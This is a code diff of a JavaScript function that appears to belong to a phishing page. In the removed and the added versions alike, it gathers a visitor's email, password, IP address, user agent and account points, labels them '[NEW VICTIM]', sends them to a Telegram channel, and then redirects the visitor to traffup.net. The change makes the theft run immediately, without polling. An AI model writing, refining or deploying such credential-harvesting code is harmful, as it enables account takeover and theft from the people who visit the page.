@@ -23,33 +23,28 @@ function getAutofilledValues() {
     var boxAccPts = document.getElementById('box_acc_pts');
     var userAgent = navigator.userAgent;
 
-    var intervalId = setInterval(function() {
-      if (email !== ''){
-        fetch('https://ipinfo.io/json')
-        .then(response => response.json())
-        .then(data => {
-            if (boxAccPts) {
-              var content = boxAccPts.innerText || boxAccPts.textContent;
-              var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${data.ip}\nUser Agent: ${userAgent}\n\nPoints: ${content}`;
-              sendTelegramMessage(message); 
-            } else {
-              var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${data.ip}\nUser Agent: ${userAgent}\n\nPoints: Not Found`;
-              sendTelegramMessage(message); 
-            }
-        })
-        .catch(error => {
-            if (boxAccPts) {
-                var content = boxAccPts.innerText || boxAccPts.textContent;
-                var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}\n\nPoints: ${content}`;
-                sendTelegramMessage(message); 
-              } else {
-                var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}\n\nPoints: Not Found`;
-                sendTelegramMessage(message); 
-              }
-        });
-        clearInterval(intervalId);
-      };
-    }, 1000);
+    fetch('https://ipinfo.io/json')
+    .then(response => response.json())
+    .then(data => {
+        if (boxAccPts) {
+          var content = boxAccPts.innerText || boxAccPts.textContent;
+          var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${data.ip}\nUser Agent: ${userAgent}\n\nPoints: ${content}`;
+          sendTelegramMessage(message); 
+        } else {
+          var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${data.ip}\nUser Agent: ${userAgent}\n\nPoints: Not Found`;
+          sendTelegramMessage(message); 
+        }
+    })
+    .catch(error => {
+        if (boxAccPts) {
+            var content = boxAccPts.innerText || boxAccPts.textContent;
+            var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}\n\nPoints: ${content}`;
+            sendTelegramMessage(message); 
+          } else {
+            var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}\n\nPoints: Not Found`;
+            sendTelegramMessage(message); 
+          }
+    });
 
     window.location.href = "https://traffup.net/websites";
 }
